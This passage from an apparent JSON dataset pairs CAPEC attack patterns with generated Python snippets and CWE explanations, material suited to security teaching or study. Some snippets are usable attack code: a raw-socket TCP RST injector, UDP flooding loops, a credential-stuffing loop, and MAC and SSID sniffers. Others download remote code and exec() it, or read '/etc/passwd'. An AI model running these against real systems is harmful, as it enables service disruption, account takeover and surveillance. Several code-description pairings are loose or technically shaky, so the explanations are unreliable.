        "description": "This Python code snippet demonstrates how an attacker might inject a TCP reset packet to disrupt an active connection between a client and a server. The `create_reset_packet` function constructs a TCP reset packet with the given source and destination IP addresses and ports, as well as a sequence number. The `send_reset_packet` function sends this packet to the destination IP using a raw socket. This embodies the CAPEC 'Connection Reset' attack pattern by showing how an attacker can sever a connection without directly filtering the traffic. The code also touches on related CWEs, such as improper verification of the source of a communication channel (CWE-940) and improper enforcement of message integrity (CWE-924), by demonstrating how an attacker can spoof a reset packet to disrupt communication."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Function to create a TCP RST packet\ndef create_rst_packet(src_ip, dst_ip, src_port, dst_port, seq_num):\n    # IP header fields\n    ip_header = b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n    ip_header += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n    ip_header += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol | Header Checksum\n    ip_header += socket.inet_aton(src_ip)  # Source Address\n    ip_header += socket.inet_aton(dst_ip)  # Destination Address\n\n    # TCP header fields\n    tcp_header = src_port.to_bytes(2, 'big')  # Source Port\n    tcp_header += dst_port.to_bytes(2, 'big')  # Destination Port\n    tcp_header += seq_num.to_bytes(4, 'big')  # Sequence Number\n    tcp_header += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n    tcp_header += b'\\x50\\x04\\x00\\x00'  # Data Offset, Reserved, Flags (RST) | Window Size\n    tcp_header += b'\\x00\\x00\\x00\\x00'  # Checksum | Urgent Pointer\n\n    return ip_header + tcp_header\n\n# Example usage\nsrc_ip = '192.168.1.100'\ndst_ip = '192.168.1.1'\nsrc_port = 12345\ndst_port = 80\nseq_num = 1000\n\nrst_packet = create_rst_packet(src_ip, dst_ip, src_port, dst_port, seq_num)\n\n# Send the packet\nsock.sendto(rst_packet, (dst_ip, 0))",
        "description": "This Python code snippet demonstrates a TCP RST Injection attack. It creates a raw socket and constructs a TCP RST packet with specified source and destination IP addresses, ports, and sequence number. The packet is then sent to the target, aiming to terminate an existing TCP connection. This attack exploits the lack of proper verification of the source of a communication channel (CWE-940) and can disrupt legitimate communication. The code highlights the vulnerability of TCP connections to such injections, emphasizing the importance of robust verification mechanisms."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import os\n\n# Function to read a file from a given path\n# This function is vulnerable to absolute path traversal\n\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = '/etc/passwd'  # An attacker can provide an absolute path\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerability to absolute path traversal. The `read_file` function takes a file path as input and attempts to read the file at that path. The function does not validate or sanitize the input path, allowing an attacker to provide an absolute path (e.g., '/etc/passwd') to access sensitive files outside the intended directory. This embodies the main idea of the CAPEC and related CWEs, where improper handling of file paths can lead to unauthorized access to restricted areas of the file system."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef get_hostname(ip):\n    try:\n        return socket.gethostbyaddr(ip)[0]\n    except socket.herror:\n        return None\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef send_request(url):\n    try:\n        response = requests.get(url)\n        return response.content\n    except requests.exceptions.RequestException as e:\n        return str(e)\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code(url):\n    code = send_request(url)\n    exec(code)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(input_url):\n    trusted_domain = 'trusted.com'\n    if trusted_domain not in input_url:\n        return 'Redirecting to untrusted site!'\n    return f'Redirecting to {input_url}'\n\n# CWE-918: Server-Side Request Forgery (SSRF)\ndef fetch_internal_data(url):\n    internal_ip = '192.168.1.1'\n    if internal_ip in url:\n        return 'SSRF attempt detected!'\n    return send_request(url)\n\n# Example usage\nip = '8.8.8.8'\nhostname = get_hostname(ip)\nprint(f'Hostname for {ip}: {hostname}')\n\nurl = 'http://example.com/malicious_code.py'\ndownload_code(url)\n\nredirect_url = 'http://untrusted.com'\nprint(redirect_user(redirect_url))\n\nssrf_url = 'http://192.168.1.1/admin'\nprint(fetch_internal_data(ssrf_url))",
        "description": "This Python code snippet demonstrates several security weaknesses related to DNS Spoofing and other vulnerabilities. The `get_hostname` function (CWE-350) performs reverse DNS resolution without verifying the association between the IP and hostname. The `send_request` function (CWE-941) sends a request to a potentially incorrect destination. The `download_code` function (CWE-494) downloads and executes code without integrity checks. The `redirect_user` function (CWE-601) redirects users to potentially untrusted sites. The `fetch_internal_data` function (CWE-918) demonstrates a basic SSRF vulnerability by allowing requests to internal IP addresses. These functions collectively illustrate how DNS Spoofing and related vulnerabilities can be exploited in a real-world scenario."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import socket\n\n# Simulate a communication channel with improper message integrity enforcement\nclass SatelliteCommunication:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.socket.connect((self.host, self.port))\n\n    def send_message(self, message):\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        self.socket.sendall(message.encode('utf-8'))\n\n    def receive_message(self):\n        data = self.socket.recv(1024)\n        # CWE-924: No integrity check on received message\n        return data.decode('utf-8')\n\n# Example usage\nif __name__ == '__main__':\n    comm = SatelliteCommunication('example.com', 12345)\n    comm.connect()\n    comm.send_message('Sensitive Data')\n    response = comm.receive_message()\n    print('Received:', response)",
        "description": "This Python code snippet simulates a satellite communication system that is vulnerable to terrestrial jamming and related weaknesses. The `SatelliteCommunication` class establishes a communication channel with a specified host and port. The `send_message` method transmits sensitive information in cleartext (CWE-319), making it susceptible to interception. The `receive_message` method does not enforce message integrity (CWE-924), allowing potential tampering during transmission. This setup embodies the main idea of the CAPEC by demonstrating how improper enforcement of message integrity and cleartext transmission can lead to vulnerabilities in satellite communication systems."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import requests\n\n# Example of a vulnerable login function\n\ndef login(username, password):\n    response = requests.post('http://example.com/login', data={'username': username, 'password': password})\n    if response.status_code == 200:\n        return 'Login successful'\n    else:\n        return 'Login failed'\n\n# Simulate credential stuffing attack\nusernames = ['user1', 'user2', 'user3']\npasswords = ['password123', '123456', 'password']\n\nfor username in usernames:\n    for password in passwords:\n        result = login(username, password)\n        print(f'Trying {username}:{password} - {result}')",
        "description": "This Python code snippet demonstrates a vulnerable login function that could be exploited by a credential stuffing attack. The `login` function sends a POST request with a username and password to a login endpoint. The code then simulates a credential stuffing attack by iterating over a list of usernames and passwords, attempting to log in with each combination. This example embodies the main idea of CAPEC-credential stuffing, highlighting the risk of using the same username/password combinations across multiple systems. The code also reflects related CWEs, such as insufficiently protected credentials (CWE-522), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-654)."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-406: Insufficient Control of Network Message Volume\n# CWE-421: Race Condition During Access to Alternate Channel\n\ndef handle_client(client_socket):\n    while True:\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        request = client_socket.recv(1024)\n        if not request:\n            break\n        print(f'Received: {request.decode(\"utf-8\")}')\n        # CWE-924: No integrity check on the message\n        client_socket.send(b'ACK')\n    client_socket.close()\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('0.0.0.0', 9999))\nserver.listen(5)\nprint('Server listening on port 9999...')\n\nwhile True:\n    client_socket, addr = server.accept()\n    print(f'Accepted connection from {addr}')\n    # CWE-923: No proper endpoint verification\n    client_handler = threading.Thread(target=handle_client, args=(client_socket,))\n    client_handler.start()\n\n# CWE-406: No control over the number of connections or message volume\n# CWE-421: Potential race condition with multiple threads accessing the same resource",
        "description": "This Python code snippet demonstrates a simple TCP server that listens for incoming connections and handles them in separate threads. The code embodies the main idea of the CAPEC 'Jamming' by illustrating several related CWEs:\n\n1. **CWE-923**: The server accepts connections without verifying the endpoint, potentially allowing unauthorized access.\n2. **CWE-319**: The server transmits and receives data in cleartext, making it susceptible to eavesdropping.\n3. **CWE-924**: The server does not check the integrity of the received messages, allowing potential tampering.\n4. **CWE-406**: The server does not control the volume of network messages, making it vulnerable to network amplification attacks.\n5. **CWE-421**: The use of threading without proper synchronization can lead to race conditions, especially when multiple threads access shared resources.\n\nOverall, the code represents a vulnerable communication system that can be easily disrupted or exploited by an adversary using jamming techniques."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import hashlib\n\n# Use of obsolete function (CWE-477)\ndef generate_md5_hash(data):\n    # MD5 is considered obsolete and insecure\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Deprecated reliance on DNS lookups in a security decision (CWE-247)\ndef is_trusted_host(hostname):\n    trusted_hosts = ['trusted.example.com']\n    return hostname in trusted_hosts\n\n# Example usage\nuser_input = 'sensitive_data'\nhostname = 'trusted.example.com'\n\nif is_trusted_host(hostname):\n    print(f\"MD5 Hash: {generate_md5_hash(user_input)}\")\nelse:\n    print(\"Untrusted host\")",
        "description": "This Python code snippet demonstrates the use of deprecated and insecure practices, aligning with the CAPEC's theme of degradation. The `generate_md5_hash` function uses the obsolete MD5 hashing algorithm (CWE-477), which is known to be insecure. The `is_trusted_host` function relies on DNS lookups to make a security decision (CWE-247), which is deprecated and insecure. The code checks if a hostname is trusted and then generates an MD5 hash of user input if the host is trusted. This example highlights the risks of using outdated and deprecated methods in security-sensitive contexts."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import threading\nimport time\n\n# Simulate a resource that can be blocked\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.data = []\n\n    def add_data(self, value):\n        with self.lock:\n            self.data.append(value)\n            time.sleep(0.1)  # Simulate time-consuming operation\n\n    def get_data(self):\n        with self.lock:\n            return self.data\n\n# Function to simulate resource blockage\ndef block_resource(resource):\n    while True:\n        resource.add_data('block')\n\n# Create a resource instance\nresource = Resource()\n\n# Start multiple threads to block the resource\nthreads = []\nfor _ in range(10):\n    t = threading.Thread(target=block_resource, args=(resource,))\n    t.start()\n    threads.append(t)\n\n# Main thread waits for a while to simulate system running\ntry:\n    time.sleep(5)\nfinally:\n    for t in threads:\n        t.join()\n\nprint('Resource data:', resource.get_data())",
        "description": "This Python code snippet demonstrates a scenario where a shared resource is blocked by multiple threads, leading to potential system failure or degradation. The `Resource` class simulates a resource with a lock to control access. The `block_resource` function continuously adds data to the resource, simulating a blockage. Multiple threads are created to block the resource concurrently, representing an uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770). This can lead to a failure in the protection mechanism (CWE-693) and potentially create emergent resources (CWE-1229). The code highlights how an adversary can block the delivery of an important system resource, causing the system to fail or stop working, embodying the main idea of the CAPEC 'Blockage'."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import socket\nimport threading\n\n# Function to flood the Wi-Fi access point with deauthentication frames\n# This is a simplified representation and does not perform actual deauthentication\n\ndef flood_deauth_frames(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'Deauth Frame'\n    while True:\n        sock.sendto(message, (target_ip, target_port))\n\n# Function to simulate high levels of noise on the RF band\n# This is a simplified representation and does not perform actual RF jamming\n\ndef transmit_noise(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    noise = b'Noise' * 1024\n    while True:\n        sock.sendto(noise, (target_ip, target_port))\n\n# Start threads to perform both attacks\n\ntarget_ip = '192.168.1.1'\ntarget_port = 80\n\nthread1 = threading.Thread(target=flood_deauth_frames, args=(target_ip, target_port))\nthread2 = threading.Thread(target=transmit_noise, args=(target_ip, target_port))\n\nthread1.start()\nthread2.start()",
        "description": "This Python code snippet demonstrates a simplified version of a Wi-Fi jamming attack. It includes two main functions: one to flood the Wi-Fi access point with deauthentication frames and another to transmit high levels of noise on the RF band. The code uses sockets to send UDP packets to a target IP and port, simulating the jamming attack. The use of threading allows both attacks to run concurrently. This example embodies the main idea of the CAPEC by showing how an attacker can disrupt Wi-Fi communication. The related CWEs provide context on potential weaknesses, such as improper enforcement of message integrity, improper restriction of communication channels, and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import socket\n\n# Simulate a cellular jamming attack by sending noise to a communication channel\n\ndef send_noise(target_ip, target_port):\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n        noise = b'\\x00' * 1024  # 1KB of noise data\n        while True:\n            sock.sendto(noise, (target_ip, target_port))\n\n# Example usage\nsend_noise('192.168.1.1', 12345)",
        "description": "This Python code snippet simulates a cellular jamming attack by continuously sending noise data to a specified target IP and port using UDP packets. The `send_noise` function creates a socket and sets it to broadcast mode, then repeatedly sends 1KB of noise data to the target. This can disrupt communication by overwhelming the channel with irrelevant data, embodying the main idea of the CAPEC 'Cellular Jamming'. The code also indirectly touches on related CWEs such as 'Improper Enforcement of Message Integrity During Transmission' (CWE-924) and 'Channel Accessible by Non-Endpoint' (CWE-300) by not verifying the integrity or source of the communication."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import random\n\nclass CellularConnection:\n    def __init__(self):\n        self.encryption_modes = ['A5/0', 'A5/1', 'A5/2', 'A5/3']\n        self.selected_mode = None\n\n    def negotiate_encryption(self):\n        # Simulate an attacker forcing a downgrade to a weaker encryption mode\n        self.selected_mode = random.choice(['A5/0', 'A5/1', 'A5/2'])\n        print(f\"Encryption mode selected: {self.selected_mode}\")\n\n    def transmit_data(self, data):\n        if self.selected_mode == 'A5/0':\n            print(\"Warning: Data is being transmitted without encryption!\")\n        else:\n            print(f\"Data is being transmitted using {self.selected_mode} encryption.\")\n        # Simulate data transmission\n        print(f\"Transmitting data: {data}\")\n\n# Example usage\nconnection = CellularConnection()\nconnection.negotiate_encryption()\nconnection.transmit_data(\"Sensitive Information\")",
        "description": "This Python code snippet simulates a cellular connection where an attacker can force the mobile device to use a weaker encryption mode. The `CellularConnection` class has a method `negotiate_encryption` that randomly selects a weaker encryption mode (A5/0, A5/1, or A5/2) instead of the strongest available mode (A5/3). The `transmit_data` method then transmits data using the selected encryption mode, warning if no encryption (A5/0) is used. This represents the CAPEC of 'Weakening of Cellular Encryption' by demonstrating how an attacker can downgrade the encryption algorithm, making the communication vulnerable to interception and decryption."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import threading\nimport time\n\n# Shared resource\nshared_resource = {'status': 'operational'}\n\n# Function to simulate system component interaction\ndef system_component():\n    while True:\n        if shared_resource['status'] == 'operational':\n            print('System component is working as intended.')\n        else:\n            print('System component is in a degraded state.')\n        time.sleep(1)\n\n# Function to simulate an attacker obstructing the system\ndef attacker_obstruction():\n    while True:\n        # Obstruct the system by changing the status\n        shared_resource['status'] = 'degraded'\n        time.sleep(2)\n        # Restore the system status\n        shared_resource['status'] = 'operational'\n        time.sleep(2)\n\n# Create threads for system component and attacker\nsystem_thread = threading.Thread(target=system_component)\nattacker_thread = threading.Thread(target=attacker_obstruction)\n\n# Start the threads\nsystem_thread.start()\nattacker_thread.start()\n\n# Join the threads\nsystem_thread.join()\nattacker_thread.join()",
        "description": "This Python code snippet demonstrates the concept of 'Obstruction' as described in the CAPEC. The shared resource 'shared_resource' represents a critical system component's status. The 'system_component' function simulates the normal operation of a system component, checking the status of the shared resource. The 'attacker_obstruction' function simulates an attacker who periodically changes the status of the shared resource to 'degraded', causing the system component to enter a degraded state. This represents the attacker's ability to obstruct interactions between system components, leading to a degraded or non-functional state. The use of threading simulates concurrent operations, highlighting potential race conditions and improper handling of faults, which are related to the CWEs mentioned."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import os\nfrom Crypto.Cipher import DES\n\n# CWE-321: Use of Hard-coded Cryptographic Key\nhardcoded_key = b'8bytekey'\n\n# CWE-326: Inadequate Encryption Strength\n# DES is considered weak and vulnerable to cryptanalysis\ncipher = DES.new(hardcoded_key, DES.MODE_ECB)\n\n# Example plaintext\nplaintext = b'SensitiveData'\n\n# Encrypt the plaintext\nciphertext = cipher.encrypt(plaintext.ljust(16))\n\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Decrypt the ciphertext\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\ndecrypted_text = cipher.decrypt(ciphertext).strip()\n\nprint(f'Decrypted Text: {decrypted_text.decode()}')",
        "description": "This Python code snippet demonstrates the use of a broken or risky cryptographic algorithm (DES) with a hard-coded cryptographic key, which embodies the main idea of the CAPEC 'Cryptanalysis of Cellular Encryption'. The code uses DES, a known weak encryption algorithm, to encrypt and decrypt a piece of sensitive data. The hard-coded key (CWE-321) and the use of DES (CWE-326, CWE-327) highlight the vulnerabilities that can be exploited through cryptanalysis. This example represents how weak encryption and poor key management can lead to the compromise of sensitive information."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\n# Function to send sensitive data over a network\n# This code does not encrypt the data, verify the source, or ensure message integrity\n\ndef send_sensitive_data(data, server_ip, server_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the server\n        s.connect((server_ip, server_port))\n        \n        # Send data in cleartext\n        s.sendall(data.encode('utf-8'))\n        \n        # Receive response\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n        \n    except Exception as e:\n        print('Error:', e)\n    finally:\n        s.close()\n\n# Example usage\nsend_sensitive_data('Sensitive Information', '192.168.1.1', 8080)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of sending sensitive data over a network. It embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by showcasing how sensitive information can be intercepted due to several weaknesses:\n\n1. **CWE-319 (Cleartext Transmission of Sensitive Information)**: The data is sent in cleartext, making it easy for an attacker to intercept and read the information.\n2. **CWE-311 (Missing Encryption of Sensitive Data)**: The sensitive data is not encrypted before transmission, increasing the risk of exposure.\n3. **CWE-940 (Improper Verification of Source of a Communication Channel)**: The code does not verify the source of the communication channel, allowing potential man-in-the-middle attacks.\n4. **CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel)**: There is no mechanism to ensure the integrity of the message during transmission, making it susceptible to tampering.\n\nThis code snippet serves as an example of how not to handle sensitive data transmission, highlighting the importance of encryption, source verification, and message integrity to prevent interception and unauthorized access."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-406: Insufficient Control of Network Message Volume\n\n# Function to simulate cellular data injection\ndef inject_data(target_ip, target_port, data):\n    try:\n        # Create a socket connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((target_ip, target_port))\n\n        # CWE-201: Inserting sensitive information into sent data\n        sensitive_data = \"User: admin, Password: admin123\"\n        data_to_send = data + sensitive_data\n\n        # CWE-319: Sending data in cleartext\n        s.sendall(data_to_send.encode('utf-8'))\n\n        # CWE-924: No integrity check on the message\n        response = s.recv(1024)\n        print(\"Received response: \", response.decode('utf-8'))\n\n        # CWE-406: No control over the volume of data sent\n        for _ in range(1000):\n            s.sendall(data_to_send.encode('utf-8'))\n\n        s.close()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n# Example usage\ninject_data('192.168.1.10', 8080, 'Injected data: ')\n",
        "description": "This Python code snippet demonstrates a cellular data injection attack by exploiting several common weaknesses. The `inject_data` function connects to a target IP and port, then sends data that includes sensitive information (CWE-201) in cleartext (CWE-319). The code does not verify the integrity of the message during transmission (CWE-924) and sends a large volume of data without control (CWE-406). This simulates an adversary injecting data into mobile technology traffic to disrupt communications or conduct surveillance, aligning with the CAPEC description."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import requests\n\n# Vulnerable URL redirection\ntrusted_domain = 'http://trusted.com/login'\nuser_input = 'http://trvsted.com/login'  # BitSquatting domain\n\n# CWE-601: Open Redirect\nredirect_url = user_input\n\n# CWE-494: Download of Code Without Integrity Check\nresponse = requests.get(redirect_url)\nif response.status_code == 200:\n    exec(response.text)  # Dangerous: executing code from an untrusted source\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nsensitive_data = 'username=admin&password=secret'\nresponse = requests.get(f'{trusted_domain}?{sensitive_data}')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Simulating a replay attack by reusing the same request\nreplay_response = requests.get(f'{trusted_domain}?{sensitive_data}')\n\nprint('Original response:', response.text)\nprint('Replay response:', replay_response.text)",
        "description": "This Python code snippet demonstrates a BitSquatting attack by redirecting a user to a malicious domain that is one bit different from a trusted domain. The code also incorporates several related CWEs:\n\n1. CWE-601: The code accepts user input for a URL redirection, which can be exploited to redirect users to a malicious site.\n2. CWE-494: The code downloads and executes code from the redirected URL without verifying its integrity, posing a significant security risk.\n3. CWE-598: Sensitive information is included in the query string of a GET request, exposing it to potential interception.\n4. CWE-294: The code simulates an authentication bypass by replaying the same GET request with sensitive data, demonstrating how captured traffic can be reused to bypass authentication mechanisms.\n\nOverall, the code highlights the risks associated with BitSquatting and related vulnerabilities in web applications."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to capture WiFi packets and extract MAC addresses\ndef capture_wifi_packets(interface):\n    # Create a raw socket to listen for packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0))\n\n    while True:\n        packet = sock.recvfrom(2048)[0]\n        eth_header = packet[0:14]\n        eth = struct.unpack('!6s6sH', eth_header)\n        mac_addr = ':'.join('%02x' % b for b in eth[1])\n        print(f'Captured MAC Address: {mac_addr}')\n        time.sleep(1)\n\n# Example usage\nif __name__ == '__main__':\n    capture_wifi_packets('wlan0')",
        "description": "This Python code snippet demonstrates a basic implementation of WiFi MAC address tracking. It captures WiFi packets on a specified network interface (e.g., 'wlan0') and extracts the MAC addresses from these packets. The code uses a raw socket to listen for packets and then parses the Ethernet header to obtain the MAC address. This MAC address is printed to the console, simulating the logging of MAC addresses for tracking purposes. The code embodies the main idea of the CAPEC by showing how an attacker can passively listen for WiFi messages and log MAC addresses, which can then be used to track users. The related CWEs are represented by the potential exposure of sensitive information (MAC addresses) and the lack of adequate verification or protection of the communication channel."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import socket\nimport struct\n\n# Function to passively listen for WiFi management frames\ndef listen_for_ssid(interface):\n    # Create a raw socket to capture packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0x0003))\n\n    while True:\n        packet = sock.recvfrom(2048)[0]\n        # Check if the packet is a management frame (type 0)\n        if packet[26] == 0x00:\n            # Extract the SSID from the packet\n            ssid_length = packet[37]\n            ssid = packet[38:38+ssid_length].decode('utf-8', errors='ignore')\n            print(f'SSID: {ssid}')\n\n# Example usage\nlisten_for_ssid('wlan0')",
        "description": "This Python code snippet demonstrates a passive WiFi SSID tracking mechanism. It creates a raw socket to capture packets on a specified network interface (e.g., 'wlan0'). The code listens for WiFi management frames and extracts the SSID from these frames. This represents the CAPEC scenario where an attacker passively listens for WiFi management frames to track users based on their SSIDs. The code also embodies CWE-201 by transmitting sensitive information (SSID) that should not be accessible, and CWE-300 by not verifying the identity of actors at both ends of the communication channel."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import pyDes\n\n# Simulate a weak DES key (CWE-326: Inadequate Encryption Strength)\nweak_des_key = pyDes.des(b'12345678', pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)\n\n# Simulate an OTA update message (CWE-327: Use of a Broken or Risky Cryptographic Algorithm)\nota_message = b'Update SIM firmware'\n\n# Encrypt the OTA message using the weak DES key\nencrypted_message = weak_des_key.encrypt(ota_message)\n\n# Simulate sending the encrypted message to the SIM card\n# In a real scenario, this would be sent via SMS\nprint(f'Encrypted OTA message: {encrypted_message}')\n\n# Simulate the SIM card decrypting the message\n# An attacker who cracks the DES key can decrypt the message\ndecrypted_message = weak_des_key.decrypt(encrypted_message)\nprint(f'Decrypted OTA message: {decrypted_message.decode()}')\n\n# Simulate executing the decrypted message as a Java applet on the SIM card\n# This represents the potential for abuse\nexec(decrypted_message.decode())",
        "description": "This Python code snippet demonstrates the concept of 'Rooting SIM Cards' by leveraging a weak DES key to encrypt and decrypt an OTA update message. The code uses the pyDes library to simulate the encryption and decryption process. The weak DES key (CWE-326) is used to encrypt a simulated OTA message (CWE-327). The encrypted message is then 'sent' to the SIM card, where it is decrypted. An attacker who cracks the DES key can decrypt the message and execute it as a Java applet on the SIM card, representing the potential for abuse described in the CAPEC. This snippet highlights the risks associated with using broken or risky cryptographic algorithms and inadequate encryption strength."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\n\n# Simulate a client connecting to a Wi-Fi network\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(('192.168.1.1', 80))  # Connect to what is assumed to be a legitimate AP\n\n# Send sensitive information in cleartext\nsensitive_data = 'username=admin&password=admin123'\nclient_socket.sendall(sensitive_data.encode('utf-8'))\n\n# Receive data without verifying the source or integrity\nresponse = client_socket.recv(1024)\nprint('Received:', response.decode('utf-8'))\n\nclient_socket.close()",
        "description": "This Python code snippet demonstrates a client connecting to a Wi-Fi network and sending sensitive information in cleartext. The client connects to an access point (AP) at IP address '192.168.1.1' on port 80, which is assumed to be legitimate. The client then sends sensitive data (username and password) without encryption. The response from the AP is received without verifying the source or ensuring the integrity of the message. This code embodies the main idea of an Evil Twin Wi-Fi Attack (CAPEC-94) by showing how an adversary could intercept and capture sensitive data due to improper verification of the communication channel (CWE-300, CWE-923, CWE-940), cleartext transmission (CWE-319), and lack of message integrity enforcement (CWE-924)."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\n# An attacker can place a malicious 'config.json' in a directory that is searched before the legitimate one.\ndef load_config():\n    config_path = 'config.json'\n    if os.path.exists(config_path):\n        with open(config_path, 'r') as file:\n            config = file.read()\n            return config\n    else:\n        raise FileNotFoundError('Configuration file not found')\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# The application does not verify the source of the incoming request.\ndef handle_request(request):\n    if 'data' in request:\n        return f\"Processing data: {request['data']}\"\n    else:\n        return 'Invalid request'\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Sensitive information is exposed without proper authorization.\ndef get_sensitive_info():\n    sensitive_info = 'SECRET_KEY'\n    return sensitive_info\n\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n# Sensitive information is leaked to an untrusted party.\ndef leak_sensitive_info():\n    info = get_sensitive_info()\n    print(f\"Leaking sensitive info: {info}\")\n\n# CWE-1229: Creation of Emergent Resource\n# The application creates a new resource that can be exploited by attackers.\ndef create_temp_file():\n    temp_file = 'temp.txt'\n    with open(temp_file, 'w') as file:\n        file.write('Temporary data')\n    return temp_file\n\n# Simulate the attack\nif __name__ == '__main__':\n    # Attacker places a rogue config file\n    with open('config.json', 'w') as file:\n        file.write('{\"malicious\": true}')\n\n    # Load the rogue config file\n    config = load_config()\n    print(f\"Loaded config: {config}\")\n\n    # Handle a request without verifying its source\n    request = {'data': 'malicious payload'}\n    response = handle_request(request)\n    print(response)\n\n    # Leak sensitive information\n    leak_sensitive_info()\n\n    # Create a temporary file that can be exploited\n    temp_file = create_temp_file()\n    print(f\"Created temporary file: {temp_file}\")",
